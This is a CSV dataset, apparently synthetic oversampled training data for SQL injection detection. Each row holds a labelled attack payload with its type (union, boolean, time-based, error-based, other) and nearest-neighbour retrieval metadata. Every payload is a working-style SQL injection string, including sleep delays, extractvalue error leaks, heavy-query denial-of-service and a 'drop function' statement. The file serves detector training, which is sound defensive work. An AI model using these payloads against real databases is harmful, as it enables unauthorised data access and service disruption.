id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000157,attack,boolean,"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",nearest_attack_euclidean,R003981,0.23408512326369765
SMOTE_000158,attack,time,1'+  (  select ukwc where 3008  =  3008 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R003933,0.2650160415893868
SMOTE_000159,attack,error,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R005929,0.18650824839517602
SMOTE_000160,attack,union,-7940'  )   union all select 6024--,nearest_attack_euclidean,R000990,0.0
SMOTE_000161,attack,boolean,"-9854%""   )    )     )   or 6455  =  3652",nearest_attack_euclidean,R003604,0.19382966351118294
SMOTE_000162,attack,boolean,-5830'  )   as fivy where 2173  =  2173 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R003753,0.15699246298614944
SMOTE_000163,attack,error,"-1639   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   3318  =  3318",nearest_attack_euclidean,R005676,0.12604961229565836
SMOTE_000164,attack,other,"iif  (  1157  =  4542,1,1/0  )  ",nearest_attack_euclidean,R001306,0.03106963444000617
SMOTE_000165,attack,boolean,-6865  )   or   (  8459  =  8459  )  *4906 and   (  6107  =  6107,nearest_attack_euclidean,R000827,0.2855106676499819
SMOTE_000166,attack,other,select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #,nearest_attack_euclidean,R004194,0.0028000999985959346
SMOTE_000167,attack,union,"-5097'  )   union all select 8992,8992,8992,8992,8992,8992,8992,8992,8992--",nearest_attack_euclidean,R002979,0.00545648656453187
SMOTE_000168,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R008752,0.042006323049121996
SMOTE_000169,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000679,0.010519059000326457
SMOTE_000170,attack,error,"1   )    )    as gcvw where 7363  =  7363 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R003014,0.5914640743075087
SMOTE_000171,attack,boolean,"1'   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000784,0.07062636004560423
SMOTE_000172,attack,boolean,"1%""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R007128,0.26541631839780777
SMOTE_000173,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R006219,0.43842388459687565
SMOTE_000174,attack,other,"iif  (  2452  =  8999,1,1/0  )  ",nearest_attack_euclidean,R001074,0.0002772387402350711
SMOTE_000175,attack,boolean,"-6636'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'kgip'  =  'kgip",nearest_attack_euclidean,R004991,0.0020267140621102442
SMOTE_000176,attack,other,"1"" where 9230  =  9230",nearest_attack_euclidean,R001494,0.0
SMOTE_000177,attack,other,1'   )    )    as nhkp where 8030  =  8030,nearest_attack_euclidean,R001806,8.429369702178807e-08
SMOTE_000178,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R006929,0.06964014816139488
SMOTE_000179,attack,union,"1%"" union all select null,null,null#",nearest_attack_euclidean,R006948,0.4737278893017697
SMOTE_000180,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R008471,0.008860706621049106
SMOTE_000181,attack,boolean,"-2722""  )   or 4907  =  8126#",nearest_attack_euclidean,R003630,0.021919309218496556
SMOTE_000182,attack,boolean,"1'||  (  select 'xyrk' from dual where 9844  =  9844 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R005733,0.6112546702068513
SMOTE_000183,attack,union,"-1526""  )   where 4870  =  4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",nearest_attack_euclidean,R008112,0.055375235591165646
SMOTE_000184,attack,union,"1'||  (  select 'xjcg' from dual where 5815  =  5815 union all select null,null,null#",nearest_attack_euclidean,R003429,0.3599513758949943
SMOTE_000185,attack,other,if  (  4135  =  2165  )   select 4135 else drop function otyy--,nearest_attack_euclidean,R004171,0.0071848526185793226
SMOTE_000186,attack,time,select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,nearest_attack_euclidean,R001576,0.13585614436287816
SMOTE_000187,attack,other,1 where 1015  =  1015,nearest_attack_euclidean,R003105,0.02129984371089353
SMOTE_000188,attack,boolean,"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""wtkx""  =  ""wtkx",nearest_attack_euclidean,R001626,0.03601483665915562
SMOTE_000189,attack,other,"iif  (  2869  =  9448,1,1/0  )  ",nearest_attack_euclidean,R003464,0.008710859632166296
SMOTE_000190,attack,boolean,"1'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R008388,0.0920711404326382
SMOTE_000191,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R002846,0.031309268923292784
SMOTE_000192,attack,union,"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",nearest_attack_euclidean,R002073,0.01057061686459867
SMOTE_000193,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R008073,0.9024463778617864
SMOTE_000194,attack,error,"-5520""   )    )    as utqk where 7762  =  7762 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R006751,0.11320902183814882
SMOTE_000195,attack,error,"  (  updatexml  (  8862,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  8862  =  8862,1   )    )     )  ,0x717a767a71  )  ,8981   )    )   ",nearest_attack_euclidean,R007074,0.757057080520081
SMOTE_000196,attack,time,1' and sleep  (  5  ) ,nearest_attack_euclidean,R002468,0.26668299116305527
SMOTE_000197,attack,boolean,"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'zglq'  =  'zglq",nearest_attack_euclidean,R006169,0.04119419507932953
SMOTE_000198,attack,union,-8143  )   union all select 3014--,nearest_attack_euclidean,R001521,0.06941338778833026
SMOTE_000199,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R007208,0.07951281962696626
SMOTE_000200,attack,boolean,"1%""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R006522,0.329557402601456
